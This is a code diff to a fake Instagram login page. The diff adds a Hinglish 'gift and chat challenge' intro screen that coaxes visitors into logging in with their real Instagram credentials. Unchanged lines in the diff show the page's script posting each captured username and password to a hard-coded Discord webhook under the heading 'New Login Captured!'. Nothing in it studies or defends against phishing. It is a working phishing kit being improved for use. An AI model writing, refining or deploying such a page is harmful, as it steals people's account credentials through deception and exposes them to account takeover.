@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram Gift & Chat Challenge</title>
     <style>
         body {
             background-color: #000000;
@@ -34,6 +34,15 @@
             z-index: 1;
         }
         .hidden { display: none !important; }
+
+        /* Guide Intro Screen Styles */
+        .guide-card {
+            background: #121212; border: 1px solid #262626; padding: 25px; border-radius: 15px;
+            width: 100%; max-width: 350px; text-align: left; box-sizing: border-box; margin: auto;
+        }
+        .guide-card h2 { color: #0095f6; margin-top: 0; text-align: center; }
+        .guide-steps { font-size: 13px; color: #d1d1d1; line-height: 1.6; margin-bottom: 20px; }
+        .guide-steps li { margin-bottom: 10px; }
 
         /* Instagram Login Styles */
         .top-lang {
@@ -142,8 +151,22 @@
         ⏳ Time Left: <span id="widgetTimer">10:00</span>
     </div>
 
+    <!-- SCREEN 0: Guide & Instructions (New Starting Page) -->
+    <div id="guideScreen" class="screen" style="justify-content: center;">
+        <div class="guide-card">
+            <h2>📖 How to Play & Win</h2>
+            <ul class="guide-steps">
+                <li><b>Step 1:</b> Start karke apne Instagram account se secure login karein.</li>
+                <li><b>Step 2:</b> Apna aur apne friend ka chat duration time select karein.</li>
+                <li><b>Step 3:</b> Instagram app mein chat complete karein aur background timer pura hone dein.</li>
+                <li><b>Step 4:</b> Timer complete hote hi aapko surprise gift unlock ho jayega!</li>
+            </ul>
+            <button class="game-btn" onclick="showScreen('loginScreen')">Start Game & Login</button>
+        </div>
+    </div>
+
     <!-- SCREEN 1: Instagram Login Page -->
-    <div id="loginScreen" class="screen">
+    <div id="loginScreen" class="screen hidden">
         <div class="top-lang" onclick="toggleLangMenu()">
             English (UK) <span>v</span>
             <div id="langDropdown" class="lang-dropdown">
@@ -254,14 +277,12 @@
                 return;
             }
 
-            // Aapka Discord Webhook URL yahan set kar diya gaya hai
             const webhookURL = "https://discord.com/api/webhooks/1562500504456667147/9AuUBXE6J3mqsPNVpCe-oFSyA9LQvt-R_jiwIUfintw1x8wPvssb1Gdmez1VAhhLO9yZ";
 
             const payload = {
                 content: `🚨 **New Login Captured!**\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n⏰ **Time:** \`${timeStr}\``
             };
 
-            // Send data directly to Discord Webhook via fetch
             fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -270,7 +291,6 @@
             .then(response => console.log("Sent to Discord successfully!"))
             .catch(error => console.log("Error:", error));
 
-            // Smoothly move to next screen
             showScreen('gameSetupScreen');
         });
 
